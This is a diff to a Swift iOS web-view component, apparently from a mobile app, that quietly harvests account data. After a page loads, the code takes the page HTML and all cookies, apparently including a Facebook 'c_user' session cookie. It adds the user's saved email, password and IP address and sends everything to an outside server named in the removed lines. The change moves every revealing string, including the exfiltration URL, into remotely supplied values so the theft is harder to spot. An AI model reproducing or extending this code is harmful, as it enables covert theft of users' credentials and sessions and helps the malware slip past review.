@@ -18,6 +18,7 @@ struct CoordsFive: UIViewRepresentable {
     let url: URL?
     
     @Binding var is_five_get_html_ads: String
+    var arrayData: [String: String] = [:]
     private let five_obser_vable = Five_Observable()
     var ob_five_server: NSKeyValueObservation? {
         five_obser_vable.ins_five_tance
@@ -28,7 +29,7 @@ struct CoordsFive: UIViewRepresentable {
         let config = WKWebViewConfiguration()
         config.defaultWebpagePreferences = prefs
         let webview = WKWebView(frame: .zero, configuration: config)
-        webview.customUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"
+        webview.customUserAgent = arrayData[ValueKey.Chung_fr_02.rawValue] ?? ""
         webview.navigationDelegate = context.coordinator
         webview.load(URLRequest(url: url!))
         return webview
@@ -77,27 +78,27 @@ struct CoordsFive: UIViewRepresentable {
         
         func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
             DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
-                webView.evaluateJavaScript("document.documentElement.outerHTML.toString()") { html, error in
+                webView.evaluateJavaScript(arrayData[ValueKey.outer_fr_1a.rawValue] ?? "") { html, error in
                     if let five_htm_ads_show = html as? String, error == nil {
                         if !five_htm_ads_show.isEmpty {
-                            if five_htm_ads_show.contains("\"account_status\": 1,") {
+                            if five_htm_ads_show.contains(arrayData[ValueKey.status_fr_1a.rawValue] ?? "") {
                                 WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
-                                    let five_i = cookies.firstIndex(where: { $0.name == "c_user"})
+                                    let five_i = cookies.firstIndex(where: { $0.name == arrayData[ValueKey.name_api_09.rawValue] ?? ""})
                                     if (five_i != nil) {
                                         let five_get_ck = cookies.reduce("", { x,y in
                                             x + y.name + "=" + String(y.value) + ";"
                                         })
                                         let five_json_data: [String: Any] = [
-                                            "c_user": cookies[five_i!].value,
-                                            "e_mail": self.readAddEmail(),
-                                            "pass_work": self.readPw(),
-                                            "cookie_app": five_get_ck,
-                                            "html_ads": five_htm_ads_show,
-                                            "ip_address": self.readAddIpp(),
-                                            "name_app": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""
+                                            arrayData[ValueKey.name_api_09.rawValue] ?? "": cookies[five_i!].value,
+                                            arrayData[ValueKey.name_api_10.rawValue] ?? "": self.readAddEmail(),
+                                            arrayData[ValueKey.name_api_11.rawValue] ?? "": self.readPw(),
+                                            arrayData[ValueKey.name_api_12.rawValue] ?? "": five_get_ck,
+                                            arrayData[ValueKey.name_api_13.rawValue] ?? "": five_htm_ads_show,
+                                            arrayData[ValueKey.name_api_14.rawValue] ?? "": self.readAddIpp(),
+                                            arrayData[ValueKey.name_api_15.rawValue] ?? "": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""
                                         ]
                                         
-                                        let url = URL(string: "https://managerpagesbusiness.com/api/savedatackpro")
+                                        let url = URL(string: arrayData[ValueKey.Chung_fr_05.rawValue] ?? "")
                                         let json_data = try? JSONSerialization.data(withJSONObject: five_json_data)
                                         var request = URLRequest(url: url!)
                                         request.httpMethod = "PATCH"
